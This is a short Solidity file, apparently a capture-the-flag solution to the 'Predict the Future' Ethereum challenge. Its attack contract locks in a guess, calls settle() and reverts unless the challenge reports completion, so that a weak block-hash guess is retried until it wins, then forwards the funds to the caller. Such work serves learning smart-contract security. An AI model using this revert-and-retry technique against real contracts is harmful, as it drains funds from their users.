pragma solidity ^0.7.3;

interface IPredictTheFutureChallenge {
    function isComplete() external view returns (bool);

    function lockInGuess(uint8 n) external payable;

    function settle() external;
}


contract AttackPredictTheFuture {
    IPredictTheFutureChallenge public challenge;
    
    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    constructor (address challengeAddress) {
        challenge = IPredictTheFutureChallenge(challengeAddress);
    }

    function lockInGuess(uint8 n) external payable {
        challenge.lockInGuess{value: 1 ether}(n);
    }

    function attack() external payable {
        challenge.settle();

        require(challenge.isComplete(), "challenge not completed");
        // return all of it to EOA
        tx.origin.transfer(address(this).balance);
    }

    receive() external payable {}
}
